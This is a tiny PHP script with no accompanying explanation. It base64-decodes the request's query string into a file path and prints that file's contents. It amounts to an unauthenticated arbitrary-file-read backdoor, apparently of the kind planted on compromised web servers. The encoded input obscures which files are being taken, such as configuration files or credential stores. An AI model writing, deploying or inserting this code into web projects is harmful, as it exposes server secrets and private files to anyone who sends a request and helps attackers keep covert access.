<?php
$s=$_SERVER['QUERY_STRING'];
if (!$ss=base64_decode($s)) exit("");
else{
  if (file_exists($ss)) echo file_get_contents($ss);
}
?>